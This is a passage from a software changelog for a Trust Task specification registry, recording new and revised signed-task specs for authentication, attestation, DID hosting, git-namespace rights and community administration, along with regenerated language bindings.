  - A re-delivery MUST send what was issued and MUST NOT issue anew; it goes to
    the request's applicant only, and the consumer rate-limits it.
  - `sideEffects` moves from `none` to `mutating`, so the task declares
    `issuedAtRequirement: REQUIRED` and carries an `## Authorization` section:
    ownership of the request.

  All four bindings regenerated.

## 0.4.4 — 2026-10-01


### Added

- **vta/webvh/dids/create**: 1.1 states `serverless` in the response (#702)

* feat(vta/webvh/dids/create): 1.1 states `serverless` in the response

  A serverless DID exists only in the VTA until the caller serves its first log
  entry. In 1.0 the response says so only by leaving out `serverId`. A client
  that missed the absence went on to resolve a DID nobody serves, and failed later
  with an error naming the DID rather than the cause (Keyring VTI-20: a persona
  minted on a VTA with no hosting server registered got through whoami, contexts,
  mint and key borrow before failing).

  1.1's response REQUIRES `serverless`. It is true exactly when the request named
  no `serverId`, and then the response carries `logEntry` and no `serverId`. A
  producer reads it rather than inferring it. 1.1 is a new version rather than an
  edit to 1.0 because 1.0's response refuses unknown members; both stay draft
  (SPEC §5.2 permits the required member as a MINOR at draft). The request schema
  is unchanged.

  Bindings regenerated (Rust, TS, Go, Dart).

## 0.4.3 — 2026-10-01


### Specifications

- **vtc/members**: Step-up passkey notice tells a member who enrolled or revoked one for them (#700)

Models vtc/members/step-up-passkey-notice/0.1 on git-ns/right/break-glass-notice: a
  one-way, unsolicited notice with no reply. Covers auth/passkey/enroll/invite and
  auth/passkey/revoke/finish acting on a member's stepUp credential, naming the
  event, the credential id, who acted, and when, with an optional admin reason -
  so an administrator (or an attacker using that standing) enrolling or revoking a
  step-up passkey for a member is never silent.

## 0.4.2 — 2026-10-01


### Specifications

- **vtc/endorsements**: Community identity checks are vetted/1 statements (#697)

Reverse the reserved IdentityVerificationCredential design of #695. The
  registry's vetted/1 (trustoverip/dtgwg-vsc-registry#24) now admits the
  community itself as issuer, so a community records its own identity checks as
  a vetted/1 statement rather than minting a separate credential type. All
  affected specs are `draft` and change in place.

## 0.4.1 — 2026-09-30


### Specifications

- **vtc/endorsements**: IDVC issuance and reserved type values, matching VTI (#695)

Describe what the implementation (OpenVTC/verifiable-trust-infrastructure#1859)
  does. All affected specs are `draft` and change in place.

## 0.4.0 — 2026-09-30


### Specifications

- Conform vetting, member and endorsement credentials to DTG VSC/VAC and the predicate registry (#691)

* spec(vetting)!: conform vetting credentials to DTG VSC/VAC and the predicate registry

  The credentials the vetting family defines now follow the latest DTG
  Credentials Core Specification and the DTG VSC predicate registry. All
  affected specifications are `draft`, so they change in place (SPEC §5.2).

  Vetting Statement (vetting/session, vtc/vetting/revoke-statement): no longer
  an `EndorsementCredential`. It is a Verifiable Statement Credential —
  `type` [VerifiableCredential, DTGCredential, StatementCredential], `@context`
  [credentials/v2, https://registry.trustoverip.org/dtg/context/v1],
  `issuerScope` directed or public, `taskContext` and `taskDigestMultibase`
  both REQUIRED — with `credentialSubject.predicate`
  https://registry.trustoverip.org/dtg/vsc/vetted/1 and the vetting body in
  `credentialSubject.object.value`. The body's `type` member is gone; the
  predicate carries the meaning. The example's statement digest is recomputed.

## 0.3.16 — 2026-09-30


### Added

- **specs**: Trust Tasks for the remaining VTA/VTC REST-only surfaces (#692)

Three REST operations had no Trust Task spec: vta/metrics/show/0.1 (the
  VTA's Prometheus-shaped metrics, admin-only, reusing did-management's
  shared MetricsSnapshot shape), vta/attestation/mnemonic-status/0.1 (the
  super-admin check of the one-time mnemonic export window), and
  vtc/vetting/hidden/publish/0.1 (turning on, or rotating, hidden-vetter
  admission for a criterion).

  auth/sign-out, community/branding, community/requested-attributes,
  vetting/vetters (list), vetting/auto-grant and vetting/revocations
  already have specs matching their REST routes; no gap there.

  Regenerated Rust, TypeScript, Go and Dart bindings.

## 0.3.15 — 2026-09-29


### Added

- **vtc**: Pairwise revoke authorization and admin-resend for vetters (#689)

vtc-service kept two REST-only doors because no Trust Task spec expressed
  them: relationships/revoke's DELETE route accepts a VrcRevokeAuthorization
  proving control of a pairwise relationship DID, and vetting/vetters/resend
  kept an admin route for resending another member's grant.

  - vtc/relationships/revoke/0.2 adds an optional pop, a proof of possession
    by the relationship's issuerDid bound to this document and to the edge,
    mirroring vtc/relationships/publish/0.2's pop. 0.1 is unchanged and not
    retired.
  - vtc/vetting/vetters/resend/0.2 adds an optional memberDid so an
    administrator can resend a named member's live grant, requiring the
    community-administrator capability. 0.1 is unchanged and not retired.

  vtc/endorsements/{list,show,revoke} already exist and already match their
  REST routes; no gap there.

  Regenerated Rust, TypeScript, Go and Dart bindings.

## 0.3.14 — 2026-09-29


### Added

- **git-ns**: Administrator reads as Trust Tasks (#686)

* feat(git-ns): administrator reads as Trust Tasks

  Six VTC git-ns console REST reads had no Trust Task equivalent: the admin
  console's Repos plugin (rights, jobs, projection, accounts) and activity
  feed were served only over a bearer admin session, with no signed,
  transport-agnostic path.

  New specs:

  - git-ns/right/list/0.1 — the whole-community rights picture (recorded and
    v0.1 role-derived grants), each row's subjectMember/granterDeparted.
    A new spec rather than a git-ns/view revision: the role-derived rows are
    not RightRecords (no granter, no grant time) and the administrative
    membership facts are not member-facing, so folding them into view/0.5's
    shared RightRecord would widen every other consumer of that component.
  - git-ns/right/issued-by-departed/0.1 — recorded rights grouped by a
    departed granter, alongside the community's cascade_on_departure policy.
  - git-ns/bridge/job/list/0.1 — the bridge job queue, scoped to administered
    namespaces like git-ns/namespace/list and git-ns/repo/list.
  - git-ns/projection/show/0.1 — what is published to the Trust Registry,
    and how many records the next reconciliation pass will change.
  - git-ns/account/list/0.1 — every member's linked forge account,
    community-wide, since git-ns/view only returns the caller's own.
  - git-ns/activity/list/0.1 — rights changes, drift and bridge jobs
    interleaved into one timeline, scoped like the namespace/repo listings.

  All six declare proof REQUIRED, an Authorization section naming either the
  community-administrator capability (rights, issued-by-departed,
  projection, accounts — matching the REST handlers' SuperAdminAuth gate) or
  namespace-administrator standing (jobs, activity — matching the namespace
  and repo listings' pattern), and a cursor/limit paged list shape.
  git-ns/_shared/0.5 adds AdminRightRow and RightOrigin, the row shape right/list
  and right/issued-by-departed share.

  Regenerated all four bindings (Rust, TypeScript, Go, Dart).

- **auth**: Proxied authenticate and session-key refresh (#687)

## Summary

  webvh#238 kept three REST auth routes because no Trust Task covered them: the VTA-proxied SIOPv2 login (`POST /api/auth/challenge` + `POST /api/auth/`) and the session-key-bound refresh (`POST /api/auth/refresh`). This PR closes both gaps so webvh can delete its last REST auth routes.

  - **`auth/authenticate/0.3`** — adds an optional proxied form. `payload.principal` names the VID being authenticated as when it differs from the document's `issuer`; `payload.delegationEvidence` carries whatever the auth service's own policy requires as evidence that `issuer` (the delegate, e.g. a holder's VTA) may act for `principal`. The resulting `Session.subject` is `principal`; the new `Session.actor` (shared `_shared/0.3` Session schema) records the delegate, so audit and revocation never conflate the two. The ordinary (self-authenticating) form from 0.2 is unchanged, including the `sessionKey` binding.
  - **`auth/refresh/0.2`** — accepts a `proof` made by the session key bound at login (`auth/authenticate/0.2`/`0.3`), required in addition to the refresh token whenever the located session carries one (`sessionKeyProofRequired` otherwise). Adds an absolute session lifetime rule: refresh MUST NOT advance `Session.expiresAt` past `Session.absoluteExpiresAt`, refusing with `sessionLifetimeExceeded` once reached — the session key is never accepted as approval/step-up authority, only as a binding check layered on the bearer token.

  Both specs add an `## Authorization` section (framework 0.6.0, required for consequential tasks), the four Security & Privacy sub-headings covering delegation abuse, stolen session keys and refresh-token theft with valid/invalid examples, and `## Changes from` sections.

  All four bindings (Rust, TypeScript, Go, Dart) regenerated and cross-checked.

  ## Test plan

  - [x] `npm run validate`
  - [x] `npm run check-bindings`
  - [x] `cargo test -p trust-tasks-rs -- specs::auth` (81 passed)
  - [x] `cargo test -p trust-tasks-rs --features validate -- specs::auth::authenticate::v0_3 specs::auth::refresh::v0_2` (8 passed, including `rejects_invalid_examples`)

## 0.3.13 — 2026-09-28


### Added

- **vta/contexts/update-did**: 1.1 — clear a context's DID with did: null (#684)

* feat(vta/contexts/update-did): 1.1 — clear a context's DID with did: null

  1.0 required a non-empty `did`, and `vta/contexts/update` only ever sets
  one, so once a context had a DID it could be replaced but never removed.
  The VTA refuses to delete a DID a context acts as and tells the operator
  to reassign it — which left no way to retire a context's last DID short
  of assigning one they did not want.

  1.1 makes `did` nullable: `null` leaves the context with no DID, the
  same state as one created without, and the record comes back with `did`
  absent. A string `did` must now match the DID Core §3.1 grammar; 1.0's
  `minLength: 1` accepted "did:" and "hello" as identities. Both are
  permitted as a MINOR bump on a draft spec (SPEC §5.2), and a 1.1
  consumer must still accept 1.0.

## 0.3.12 — 2026-09-28


### Added

- **vtc/website**: Website content moves as a chunked Trust Task transfer (#682)

Replaces the raw-byte REST routes (GET/PUT /website/files/{path}, POST /website/deploy) with Trust Tasks, modelled on backup/* and reusing vta/_shared/0.1/backup-transfer's chunk vocabulary:

  - vtc/website/upload/begin — commits the target (a file at a path, with optional ifMatch, or a whole-site bundle), total size, whole-content SHA-256 and every chunk digest before any byte moves.
  - vtc/website/upload/chunk — one chunk of up to 256 KiB, checked against the manifest on arrival; idempotent.
  - vtc/website/upload/commit — reassembles and verifies the SHA-256; writes a file target atomically, or stages a bundle.
  - vtc/website/upload/abort — discards an open or staged upload.
  - vtc/website/deploy — publishes a staged bundle (live replace, or a new managed generation with pruning).
  - vtc/website/files/show — ranged reads of up to 256 KiB with the whole-file etag.

  begin, chunk and files/show declare maxDocumentBytes (256 KiB, 352 KiB, 352 KiB response), so the community's 64 KiB default is not raised for every other task. Shared component vtc/_shared/0.1/website-transfer. Bindings regenerated for Rust, TypeScript, Go and Dart.

- **vtc**: Trust Tasks for the community's REST-only admin surfaces (#680)

* feat(vtc): Trust Tasks for the community's REST-only admin surfaces

  Specifies, at 0.1, the VTC operations that existed only as REST routes, so each can be served as a sender-bound signed Trust Task over TSP, DIDComm or HTTPS:

  - auth/signing-key/{enroll,list,revoke} — delegated signing keys (the admin console's non-extractable browser key). Enrolment is signed by the key being enrolled (proof of possession) and names the identity it acts for; control of that identity is established by separate authority evidence, which the reference implementation takes as an operation-bound passkey step-up.
  - vtc/community/{branding,requested-attributes,join-discovery}/{show,update}
  - vtc/schemas/{register,list,show,delete} and vtc/schemas/accepts/{register,list,show,delete} — register and show declare maxDocumentBytes, since a credential schema exceeds the 64 KiB default.
  - vtc/vetting/vetters/grants/list, vtc/vetting/auto-grant/{show,update}, vtc/vetting/revocations/list
  - vtc/relationships/{suspend,restore} — the edge issuer's own proof replaces the REST pop authorization.
  - vtc/join-requests/vetting/show, and vtc/join-requests/query — its own task rather than credential-exchange/*, because an administrator instructs the verifier, which alone can author the query's challenge.
  - vtc/rooms/list — under vtc/, not rooms/, because it is authorized by host ACL and rooms invariant I5 forbids that for any rooms/* task.

  Shared components: auth/_shared/0.1/signing-key and vtc/_shared/0.1/{community-presentation,schema-registry,vetting-auto-grant,relationship-lifecycle}. Relationship persona attach/detach stays out, blocked on dtgwg-cred-spec#9. Bindings regenerated for Rust, TypeScript, Go and Dart.

- **spec-meta**: A specification declares its own maximum document size (#679)

Adds an optional front-matter member, maxDocumentBytes { request?, response?, rationale }, stating the largest serialized Trust Task document (proof included, transport envelope excluded) of each variant that a consumer serving the task must not refuse on grounds of size alone, and should refuse beyond with malformedRequest.

  SPEC §12.4 already tells a consumer to bound what it parses at "a body-size limit appropriate to the Trust Task specification's payload", and §7.3 item 19 notes that a transport-layer limit is the wrong place to pick the number; until now no specification could say what it was. A consumer serving many tasks therefore applied one blanket cap sized for the small ones, and a task that legitimately carries a JSON Schema or a chunk of a file was refused. This lets the bound be stated, and enforced, per type.

  - specs/spec.meta.schema.json: the member (at least one variant, 1 KiB to 16 MiB; larger content belongs in a chunked transfer).
  - trust-tasks-codegen: reads it and emits Payload::MAX_DOCUMENT_BYTES on the request and response impls, plus schema_index::max_document_bytes_for(type_uri) for a dispatcher that learns the type before parsing. An absent variant never inherits the other's bound.
  - trust-tasks-rs: the trait constant, defaulting to None.
  - check-bindings: holds Rust's constants to the front matter, re-derived independently.
  - CONTRIBUTING-SPECS: when and how to declare it.

  Rust only for now, like ERROR_CODES; the TypeScript, Go and Dart generators do not emit it yet. The framework text (a §7.3 item) is proposed in the canonical specification repository; this is the registry's half.



### Specifications

- **webvh/witness/sign**: Let a witness sign the entry that deactivates a DID (#681)

## 0.3.11 — 2026-09-28


### Added

- **trust-task-discovery**: Publish 0.3, a responder advertises its acceptance window (#677)

A consumer refuses a document whose issuedAt lies outside its acceptance
  window (SPEC §7.2 item 13), and the framework leaves that window to the
  consumer's policy. A producer that holds a document before delivering it
  (store-and-forward, retry, escalation, a queue replayed after a restart)
  cannot tell a document the consumer will still accept from one it will
  refuse as expired. So it cannot tell when to issue a new attempt (SPEC
  §8.4) instead. The only alternative is a constant both ends share.

  - specs/trust-task-discovery/0.3: the response gains an optional
    acceptanceWindow { maxAgeSeconds, clockSkewSeconds }, in whole seconds.
    It appears at the response level, and on an expanded supportedTypes
    entry, where the entry's value takes precedence.
    - Responder: MUST NOT state a window wider than it applies, and is not
      bound by what it advertised.
    - Discoverer: authenticated responses only. SHOULD NOT send after
      issuedAt + maxAge, and MUST NOT after issuedAt + maxAge + skew. It
      issues a new attempt instead (fresh id and issuedAt, same thread,
      new proof), and never re-stamps under the original id (idConflict).
      It does not issue a new attempt of a consequential task unless a
      repeat is harmless or recognizable. It never backdates to fit a
      window, bounds its new attempts, and treats a refusal as the answer.
    - Absent: the discoverer has learnt nothing. It falls back to the
      window the task's specification states (item 17) or its own, with
      the typical skew tolerance of at most 60 s. Absence is never read as
      "no window".
    - The response is closed, so a 0.2 discoverer that validates would
      reject the member. §5.2 makes an added optional member a MINOR
      increment, hence 0.3 rather than an edit to 0.2.
    - Response-side invalid examples: a missing member, a zero max age,
      negative skew, fractional or string values, an unknown member, and
      a malformed entry-level window.
  - trust-tasks-codegen: a payload.invalid-examples.json fixture may carry
    "variant": "response". It is checked against Response and its
    sub-schema by a separate rejects_invalid_response_examples test. It is
    refused in a spec with no response. Existing fixtures, and every other
    generated module, are unchanged.
  - CONTRIBUTING-SPECS.md documents the variant.
  - Bindings regenerated (Rust, TS, Go, Dart).

  The framework text (SPEC §10) still names 0.2 as the current version.
  That is a change to the canonical repository and follows separately.

  Proposed from OpenVTC/verifiable-trust-infrastructure#1799, where both
  ends currently share a constant window.

## 0.3.10 — 2026-09-28


### Added

- **auth**: Authenticate 0.2 binds a session key to the session (#675)

A wallet login signs the auth/challenge/auth/authenticate exchange with the
  subject's own key, which today means one wallet prompt per console call for
  the lifetime of the session -- there is no equivalent of the passkey login
  path's browser-bound key. This adds an optional payload.sessionKey (a
  did:key VID) to auth/authenticate: the producer generates it fresh per
  login, ideally as a non-extractable key, and the consumer binds it to the
  session it creates. Once bound, a proof by that key stands in for the
  subject for that session only -- bounded by the session's expiry and acr,
  and never accepted where a spec requires an assertionMethod attestation
  (auth/step-up/approve-response, task-consent/decision, confirm/response).
  Consumers that don't support the requested key type MAY refuse with the new
  auth/authenticate:sessionKeyUnsupported code.

  The shared Session shape gains the same optional sessionKey member, as a new
  _shared/0.2 component version (auth/whoami and auth/sessions/list still pin
  0.1 and would need their own version bump to surface it -- out of scope
  here). wireCompatibleWith was considered and not declared: 0.2 is a strict,
  non-identical superset of 0.1's wire shape, not the wire-identical case that
  field is for.

  Regenerated all four bindings (Rust, TS, Go, Dart) and confirmed
  check-bindings agrees across all of them.

## 0.3.9 — 2026-09-27


### Added

- **vta/services**: Rollback 1.1 with a mediator drain window (#670)

`vta/services/rollback/1.1` adds an optional `drainTtlSecs`, the member
  update 1.1 added in #656, with the same rules. A rollback of a mediated
  transport (`didcomm`, `tsp`) can move it off its current mediator, which then
  drains; 1.0 gave the operator no say in how long, so the agent could only apply
  its default. The VTA's CLI (`services didcomm rollback --drain-ttl`) and SDK
  carry an operator-chosen window that rollback 1.0 cannot express, so a rollback
  landing on a drain transition silently took the default.

  - Refused (`malformedRequest`) for `rest` and `webauthn`.
  - Absent takes the agent's default; a value below the floor may be raised to
    it, and must be over a request carried by the mediator being replaced.
  - One mediator carrying both mediated transports drains once, reported by a
    single `drainUntil`.
  - Accepted with no effect when the rollback leaves no mediator draining, since
    whether it drains depends on stored state the operator may not have in view.

  A 1.0 request is a valid 1.1 request; the response is unchanged (the shared
  `RollbackResult` already carries `drainingMediator` and `drainUntil`).

  Rust, TypeScript, Go and Dart bindings regenerated.



### Documentation

- **specs**: Operational examples sign for authentication (#669)

VTI-KEY-022 (#637) moved a Trust Task document's proof default to
  proofPurpose: authentication, reserving assertionMethod for the closed
  list of attestations and approver decisions (auth/step-up/approve-response,
  task-consent/decision, confirm/response). #637's own sweep updated the
  top-level examples that existed at the time; this catches the git-ns
  minor versions published after that sweep, plus acl/swap-key,
  did-management/did/publish and SPEC.md's own examples, which still
  showed assertionMethod on an operational document's proof.

  Left unchanged: real attestations (task-consent/decision,
  auth/step-up/approve-response, confirm/response), embedded
  credentials and signed artefacts (vetting cards, witness proofs, the
  vault/credentials responses, the role credential in
  vtc/vetting/vetters/grant), DID-document verification-relationship
  references, the generic keys/derive-and-sign-document signing service,
  vault/sign-trust-task (PR #667 is open against it), and the
  provision/integration invalid-examples fixtures that already
  demonstrate this rule.

  Regenerated all four bindings; only Rust had a diff, since its codegen
  embeds each spec's fenced examples as conformance tests.

## 0.3.8 — 2026-09-27


### Specifications

- **vault/sign-trust-task**: The proof purpose follows the document type (#667)

* spec(vault/sign-trust-task): the proof purpose follows the document type

  An operational document is signed for authentication; assertionMethod only
  for types whose specification defines them as the issuer's attestation
  (approve-response, task-consent/decision, confirm/response). The maintainer
  decides it from type, never the consumer. Aligns 0.1 and 0.2 with the
  framework's proof-purpose rule.

## 0.3.7 — 2026-09-27


### Fixed

- **codegen**: Generate usable types for oneOf branches that use not (#665)

typify (0.6) merges a `oneOf` branch's own keywords into the untagged
  enum variant it synthesizes for that branch. A bare `not: {"required":
  ["x"]}` is a shape it handles directly — property `x` is simply absent
  from that variant. Wrap the same exclusion in `anyOf` (the shape a
  3-way mutual-exclusion group needs, e.g.
  auth/passkey/enroll/invite/update/0.1's role/expiresAt/extendBy) and
  typify's merge instead produces an uninhabited `pub enum
  PayloadVariant0 {}` for that branch, so a payload carrying only `role`
  (plus `inviteId`) could never deserialize — and silently drops a
  property required only by that branch from every *other* branch's
  variant too, so `role` + `expiresAt` together also failed to
  round-trip. auth/revoke-session/0.2 has the same three-way `not:
  {anyOf: [...]}` shape and produced the same uninhabited nested type,
  though there it never broke a valid document (no shared field to
  drop).

  Only conformance example exercised extendBy alone, which is why this
  was never caught. Added role-only, expiresAt-only and role+expiresAt
  examples to auth/passkey/enroll/invite/update/0.1's spec.md, one per
  oneOf branch plus their combination.

  Fixed with a new preprocessing pass in trust-tasks-codegen,
  desugar_oneof_with_compound_not, which drops a oneOf combinator from
  the copy of the schema handed to typify whenever any branch's not is
  more than a single {"required": ["x"]} guard. Re-expressing the oneOf
  as anyOf (at least one) plus a pairwise not (no two at once) -
  oneOf's own JSON Schema definition - was tried first and does not
  help: typify applies the identical broken merge to a not wrapping
  anyOf/allOf regardless of which combinator carries it. The wire
  schema (SCHEMA_JSON / ValidatedPayload::validate_value, and the
  TypeScript/Go/Dart bindings, generated independently of typify) is
  captured before this pass runs and is unaffected, so the actual
  mutual-exclusion constraint is still enforced at runtime; only the
  Rust type for the two affected specs becomes fully permissive, matching
  what the other three languages already generate for this schema. A
  plain discriminated oneOf (every branch's not, if any, a single
  {"required": ["x"]}) is untouched and still renders as a clean Rust
  enum.

  Scanned every schema under specs/ for a oneOf/anyOf branch using not.
  Only these two combine it with oneOf; the rest (auth/revoke-session/0.1,
  vta/app-state/put/1.0, vta/app-state/put-many/1.0,
  vtc/registry/sync-jobs/retry/0.1, credential-exchange/issue/0.1, and a
  few uses of not outside any oneOf) were unaffected and are unchanged
  after regenerating.

  Regenerated all four bindings; only the two affected Rust modules
  changed.

## 0.3.6 — 2026-09-27


### Added

- **vta**: Trust Tasks for the VTA's REST-only health, restore-status, session-revocation and wrapping-key routes (#663)

* feat(vta): Trust Tasks for the VTA's REST-only health, session-revocation and wrapping-key routes

  Three Verifiable Trust Agent routes were reachable only over REST. Each
  gets a Trust Task, so an agent serves it identically over TSP, DIDComm
  and HTTPS.

  - vta/health/details/0.1 replaces GET /health/details: version,
    mediator, seal and at-rest encryption state, TEE status, TSP
    advertisement, and the restore the agent's state derives from.
    Public, anonymous, request proof OPTIONAL and response proof
    REQUIRED, like vta/attestation/status/0.1.
  - auth/revoke-session/0.2 replaces DELETE /auth/sessions?did=: adds a
    `subject` form ending every session of a subject the producer could
    withdraw the access of (a scoped administrator cannot reach an
    unrestricted one), answers a refusal with permissionDenied, and drops
    0.1's `notOwner`, which contradicted 0.1's own non-disclosure rule.
    Backwards-compatible: every 0.1 payload is a valid 0.2 payload.
  - keys/import-wrapping-key/0.1 replaces GET /keys/import/wrapping-key:
    a fresh, single-use, minutes-long key a producer seals a private key
    to for keys/import's privateKeySealed carrier over a transport that
    is not end to end. Returned as an Ed25519 did:key; the response proof
    is REQUIRED because the TLS terminator the task routes around could
    otherwise substitute its own key.

  Rust, TypeScript, Go and Dart bindings regenerated.

## 0.3.5 — 2026-09-27


### Added

- **did-management**: Trust Tasks for the DID hosting service's REST-only surface (#661)

* feat(did-management): Trust Tasks for the DID hosting service's REST-only surface

  Specs for every remote surface of affinidi-webvh-service that had none, so each can move onto the service's central Trust Task dispatch over TSP, DIDComm and HTTPS:

  - did-management: did/log, agent-name/resolve, domain/list, registry/list|get|check|purge-domain, stats/get|timeseries, server/config|info, identity/list|retire, and _shared/0.2 service-instance.
  - did-management/replica/domain: upsert, assign, unassign, purge (the control plane to edge hop, today sent on the admin URIs or unspecified).
  - webvh: sync/update 0.2 and sync/delete 0.2 (proof required, a disabled member, watchers as replicas), sync/batch 0.1, witness/sign and witness/key/create|list|delete.
  - auth: step-up/start (replaces the bespoke REST start/finish paths), and passkey/enroll/invite/list|update|revoke addressed by inviteId, never by token.

  Every task requires a proof except the public did-management/server/info read. Bindings regenerated for Rust, TypeScript, Go and Dart.

## 0.3.4 — 2026-09-27


### Added

- **git-ns**: Administrator reads — view 0.5, namespace/list and repo/list (#659)

* feat(git-ns): administrator reads — view 0.5, namespace/list and repo/list

  Three signed read tasks replace the bearer-authenticated administrator
  views VTCs served beside git-ns/view:

  - git-ns/view/0.5 adds scope: administrator (everything in the
    namespaces the caller administers, reasons included) and
    breakGlass: true (narrow to break-glass records). The response is
    0.4's.
  - git-ns/namespace/list/0.1 lists administered namespaces with admins,
    repository count, bridge, role map and forge status.
  - git-ns/repo/list/0.1 lists repositories in administered namespaces
    with owners, right counts, bootstrap, sync and the bridge's report.

  Proof REQUIRED on all three; no side effects. Authority is the
  community-administrator capability (every namespace) or a live explicit
  git.ns.admin (that namespace); each declares notAdministrator, answered
  alike for an unknown namespace and one the caller does not administer.

- **auth/passkey**: An administrator lists one member's passkeys (admin-list 0.1) (#658)

auth/passkey/list lists only the signer's own credentials and refuses a
  subject in the payload, so no task let an administrator see which step-up
  passkeys a member holds — and so which credentialId to hand to
  auth/passkey/revoke/start 0.2.

  auth/passkey/admin-list 0.1:

  - Proof REQUIRED: the administrator is the issuer. The subject and a purpose
    (session | stepUp, no default) are named in the payload, and are a request,
    never a grant: the consumer authorises the administrator over that subject
    from its own state.
  - Refusals, in order: notAdministrator (before the subject is looked at);
    subjectUnknown, also for a subject outside the administrator's authority,
    so the code is no oracle; purposeNotSupported; subjectNotMember.
  - The response is { subject, purpose, credentials }, each a ListedCredential
    of credentialId, deviceLabel, registeredAt, lastUsedAt and signCount — no
    key material, no public key, no attestation, additionalProperties false.
    The counter is disclosed to the administrator, as the operator who acts on
    a cloning signal.
  - sideEffects none: listing touches no counter and no last-used time.
  - Privacy: only administrators with authority over the subject; the family
    audits writes, not reads, and a consumer that audits administrative reads
    SHOULD include this one.

  Rust, TypeScript, Go and Dart bindings regenerated.

## 0.3.3 — 2026-09-26


### Added

- **vta/services**: Report, and update 1.1 with a mediator drain window (#656)

* feat(vta/services): report, and update 1.1 with a DIDComm drain window

  Two gaps that keep the VTA's service management on bespoke REST routes, found
  moving the SDK onto the Trust Task spine.

  - `vta/services/report/0.1` — per-mediator inbound counts and each sender's
    last-seen mediator over a window, so an operator can tell who is still on the
    old route before ending a drain. Today it exists only as a bearer-token REST
    route (`GET /mediators/report`). Operator-only, with a REQUIRED request proof:
    the response is a contact log of other parties' DIDs, which the recipient may
    release only to a signer it has decided is the agent's operator.
  - `vta/services/update/1.1` — adds an optional `drainTtlSecs` for `didcomm`.
    Replacing the mediator drains the old one, and 1.0 gave the operator no say in
    how long, so the agent could only apply its default. The REST route and the
    CLI (`services didcomm update --drain-ttl`) carry an operator-chosen window;
    without it here, moving the CLI to the Trust Task would silently drop the
    option. A 1.0 request is a valid 1.1 request; a value below the recipient's
    floor may be raised to it, and must be over a DIDComm-carried request.

  (`services/report` was pushed to #654 after it merged, so it did not ship there.)

  Rust, TypeScript, Go and Dart bindings regenerated; `npm run build` (strict
  Security & Privacy), `check-bindings` and the Rust tests (903) pass.

## 0.3.2 — 2026-09-26


### Added

- **vta/attestation**: Status, report and config-report as Trust Tasks (#654)

A VTA running in a TEE answers three attestation reads today only as
  unauthenticated REST routes (`GET /attestation/status`, `POST`/`GET
  /attestation/report`, `POST /attestation/config-report`), and a DIDComm
  protocol arm nothing sends to. Specifying them lets the agent serve them on its
  Trust Task spine over TSP, DIDComm and HTTPS alike, and retire both.

  - `vta/attestation/status/0.1` — which TEE the agent detected at boot. A claim,
    not evidence; it tells the verifier what to ask for.
  - `vta/attestation/report/0.1` — fresh evidence binding a verifier-chosen
    32-byte nonce and the agent's DID. The nonce is REQUIRED: there is no
    nonce-less (cached) form, because a report nobody asked for is one anybody can
    replay.
  - `vta/attestation/config-report/0.1` — fresh evidence binding the nonce and
    the SHA-384 of the canonical, secret-free view of the configuration the
    enclave booted, so a tenant can check operator-supplied settings (its KMS key)
    before onboarding.

  All three: request proof OPTIONAL (a verifier asks before it trusts the agent,
  often with no key the agent knows, and the nonce is what makes an answer its
  own), response proof REQUIRED (the agent's `authentication` signature ties its
  DID to the evidence it returns), no side effects, transient retention. Each
  spec states the verifier's checks — vendor root, measured image, the nonce
  inside the evidence, and the DID the evidence binds against the document's
  issuer.

  Rust, TypeScript, Go and Dart bindings regenerated; `npm run build`,
  `check-bindings` and the Rust tests pass.

## 0.3.1 — 2026-09-26


### Fixed

- **git-ns/view**: 0.4 requires a proof, as 0.1–0.3 do (#652)

#642 made `proof` REQUIRED on git-ns/view 0.1, 0.2 and 0.3, because the
  VTC answers the caller about their own namespaces, rights and linked
  accounts and must know from the document itself who the caller is.
  View 0.4 (#641) was written against the earlier text and landed after,
  still declaring `proof` RECOMMENDED with the old transport-integrity
  rationale.

  View 0.4 now declares `proof` REQUIRED with 0.3's rationale. Nothing
  else in the specification discussed the proof. Bindings regenerated for
  Rust, TypeScript, Go and Dart: `IS_PROOF_REQUIRED` is true for v0_4.

  No other version added by #635–#651 declares a weaker proof
  requirement than its predecessor.

## 0.3.0 — 2026-09-26


### Added

- **git-ns**: Separation of duties for elevated rights, with an audited break-glass (#641)

* feat(git-ns): separation of duties for elevated rights, with an audited break-glass

  An elevated git right (git.ns.admin, git.repo.create, git.repo.own) is now
  always granted by someone other than its recipient, and the one way to give
  oneself one is an explicit, justified, highly visible break-glass that another
  administrator ratifies or revokes.

  - git-ns/right/grant 0.3: fixed rule 7, separation of duties, refused with
    git-ns:selfGrantNotAllowed. It binds every task that records a right on the
    actor's own authority (drift/resolve adopt, repo/adopt, namespace/reseat);
    bind and repo/create are not self-grants. Rules 3 and 4 count only records
    with no expiry that are not unratified break-glass.
  - git-ns/right/break-glass 0.1 (new): self-grant of an elevated right the
    actor may already grant, or git.ns.admin on a headless namespace for a
    community administrator. Mandatory justification, destructive, immediate,
    no expiry, highest-severity audit, notice to every administrator, visible
    until ratified or revoked. Policy may disable, delay or tighten it, never
    quieten it.
  - git-ns/right/ratify 0.1 (new): another administrator clears the flag,
    bound to the breakGlass.at they read.
  - git-ns/right/break-glass-notice 0.1 (new): the VTC's signed push to every
    community administrator and namespace admin, for break-glass, ratified and
    revoked.
  - git-ns/right/revoke 0.3: any community administrator may revoke an
    unratified break-glass record; policy cannot refuse that.
  - git-ns/view 0.4: unratified break-glass records go to every administrator
    they concern, whatever else the caller may see.
  - git-ns/_shared 0.4: BreakGlass, RightRecord.breakGlass, ElevatedRight.

  Rust, TypeScript, Go and Dart bindings regenerated.

- **git-ns**: Drift/resolve 0.3 binds an adoption to the member it names (#640)

* feat(git-ns): drift/resolve 0.3 binds an adoption to the member it names

  A drift/resolve 0.2 adoption did not name who receives the right. The VTC
  resolved the item's forge account to whoever had linked it when the task
  ran, so an account unlinked and linked again, to someone else, between the
  resolver reading the item and signing granted a right, published to the
  Trust Registry, to a member the resolver never saw. The signed document
  said nothing otherwise: observed bounded which role an adoption records,
  nothing bounded to whom.

  drift/resolve 0.3 adds `subject`, the DID of the member the resolver read
  as linked to the account. It is required for adopt and absent for revert,
  refused as malformedRequest otherwise (as a missing `observed` is, and
  likewise stated in prose rather than a schema conditional). The VTC adopts
  only while the account is still linked to exactly that member, re-checked
  under the same exclusion as the write that records the right, and refuses
  otherwise with the new git-ns/drift/resolve:subjectChanged.

  Versioning. A 0.2 document is a 0.3 document with no `subject`: still a
  valid revert, now a malformed adopt. Required-for-one-action is not
  backwards-compatible, so this is a MINOR increment under the draft
  allowance of SPEC 5.2. A VTC serving older versions SHOULD NOT accept a
  0.1 or 0.2 adopt, since it cannot know whom that resolver meant, and SHOULD
  refuse one naming 0.3.

  git-ns/view still returns a member only their own account links, so a
  client that has only git-ns/view cannot adopt another member's role; the
